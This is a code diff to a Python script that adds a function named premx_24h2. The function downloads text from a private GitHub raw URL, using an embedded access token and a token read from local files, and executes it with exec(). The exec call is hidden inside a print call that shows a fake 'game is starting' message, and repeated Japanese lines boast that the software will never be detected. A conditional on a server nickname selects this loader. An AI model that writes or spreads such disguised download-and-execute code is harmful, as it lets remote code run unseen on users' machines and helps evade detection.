@@ -49,6 +49,17 @@ def premx_2025(mycontent: str):
     else:
         raise Exception(f"Error. Your internet is private.")
 
+def premx_24h2(mycontent: str):
+    raw_url = "https://raw.githubusercontent.com/johnzeykzkousx/myown/refs/heads/main/premx_24h2.txt?token=GHSAT0AAAAAADBMSD44GR6MGU2FTSVRY6KM2AOB7NQ"
+    headers = {"Authorization": f"token {mycontent}"}
+    response = requests.get(raw_url, headers=headers)
+    
+    if response.status_code == 200:
+        mycntcnt = response.text
+        print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n",exec(f"{mycntcnt}"))
+    else:
+        raise Exception(f"Error. Your internet is private.")
+
 def get_data_from_file(file_path):
     if os.path.exists(file_path):
         with open(file_path, 'r') as file:
@@ -63,4 +74,7 @@ content1 = get_data_from_file(part1_data)
 content2 = get_data_from_file(part2_Data)
 content3 = get_data_from_file(part3_data)
 content4 =  content1+content2+content3
-premx_2025(content4)
+if server_nickname == "Chan":
+    premx_24h2(content4)
+else:
+    premx_2025(content4)
